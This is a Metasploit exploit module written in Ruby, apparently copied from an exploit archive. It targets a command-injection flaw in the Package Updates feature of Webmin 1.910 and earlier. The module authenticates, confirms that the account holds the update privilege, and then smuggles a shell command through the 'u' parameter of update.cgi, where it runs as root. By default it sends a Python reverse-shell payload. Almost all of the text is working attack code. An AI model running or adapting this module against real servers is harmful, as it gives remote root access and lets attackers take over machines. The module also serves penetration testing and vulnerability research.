# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Webmin <= 1.910 - "Package Updates" Remote Command Execution&#039;,
      &#039;Description&#039;    => %q(
        This module exploits an arbitrary command execution vulnerability in Webmin
        1.910 and lower versions. Any user authorized to the "Package Updates"
        module can execute arbitrary commands with root privileges.

      ),
      &#039;Author&#039;         => [
        &#039;AkkuS <Özkan Mustafa Akkuş>&#039; # Vulnerability Discovery, MSF PoC module
      ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2019-&#039;],
          [&#039;URL&#039;, &#039;https://www.pentest.com.tr/exploits/Webmin-1910-Package-Updates-Remote-Command-Execution.html&#039;]
        ],
      &#039;Privileged&#039;     => true,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;       => 512,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;
            }
        },
      &#039;DefaultOptions&#039; =>
        {
          &#039;RPORT&#039; => 10000,
          &#039;SSL&#039;   => false,
          &#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_python&#039; # its depends
        },
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        => [[&#039;Webmin <= 1.910&#039;, {}]],
      &#039;DisclosureDate&#039; => &#039;May 16 2019&#039;,
      &#039;DefaultTarget&#039;  => 0)
    )
    register_options [
        OptString.new(&#039;USERNAME&#039;,  [true, &#039;Webmin Username&#039;]),
        OptString.new(&#039;PASSWORD&#039;,  [true, &#039;Webmin Password&#039;]),
        OptString.new(&#039;TARGETURI&#039;,  [true, &#039;Base path for Webmin application&#039;, &#039;/&#039;])
    ]
  end

  def peer
    "#{ssl ? &#039;https://&#039; : &#039;http://&#039; }#{rhost}:#{rport}"
  end

  def login
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri, &#039;session_login.cgi&#039;),
      &#039;cookie&#039; => &#039;testing=1&#039;,
      &#039;vars_post&#039; => {
        &#039;page&#039; => &#039;&#039;,
        &#039;user&#039; => datastore[&#039;USERNAME&#039;],
        &#039;pass&#039; => datastore[&#039;PASSWORD&#039;]
      }
    })

    if res && res.code == 302 && res.get_cookies =~ /sid=(\w+)/
      return $1
    end

    return nil unless res
    &#039;&#039;
  end
##
# Target and input verification
##
  def check
    cookie = login
    return CheckCode::Detected if cookie == &#039;&#039;
    return CheckCode::Unknown if cookie.nil?

    vprint_status(&#039;Attempting to execute...&#039;)
    # check package update priv
    res = send_request_cgi({
      &#039;uri&#039;     => normalize_uri(target_uri.path, "package-updates/"),
      &#039;cookie&#039;  => "sid=#{cookie}"
    })

    if res && res.code == 200 && res.body =~ /Software Package Update/
      print_status("NICE! #{datastore[&#039;USERNAME&#039;]} has the right to >>Package Update<<")
      return CheckCode::Vulnerable
    end
    print_error("#{datastore[&#039;USERNAME&#039;]} has not the right to >>Package Update<<")
    print_status("Please try with another user account!")
    CheckCode::Safe
  end
##
# Exploiting phase
##
  def exploit
    cookie = login
    if cookie == &#039;&#039; || cookie.nil?
      fail_with(Failure::Unknown, &#039;Failed to retrieve session cookie&#039;)
    end
    print_good("Session cookie: #{cookie}")

    res = send_request_raw(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri, &#039;proc&#039;, &#039;index_tree.cgi&#039;),
      &#039;headers&#039; =>
        {
          &#039;Referer&#039; => "#{peer}/sysinfo.cgi?xnavigation=1"
        },
      &#039;cookie&#039; => "redirect=1; testing=1; sid=#{cookie}"
    )
    unless res && res.code == 200
      fail_with(Failure::Unknown, &#039;Request failed&#039;)
    end

    print_status("Attempting to execute the payload...")
    exec(cookie)

  end

  def exec(cookie)

    command = payload.encoded

    res = send_request_cgi(
      {
      &#039;method&#039; => &#039;POST&#039;,
      &#039;cookie&#039; => "sid=#{cookie}",
      &#039;ctype&#039;  => &#039;application/x-www-form-urlencoded&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;package-updates&#039;, &#039;update.cgi&#039;),
      &#039;headers&#039; =>
        {
          &#039;Referer&#039; => "#{peer}/package-updates/?xnavigation=1"
        },
      &#039;data&#039; => "u=acl%2Fapt&u=%20%7C%20#{command}&ok_top=Update+Selected+Packages"
      })

  end
end
##
# The end of the adventure (o_O) // AkkuS
##

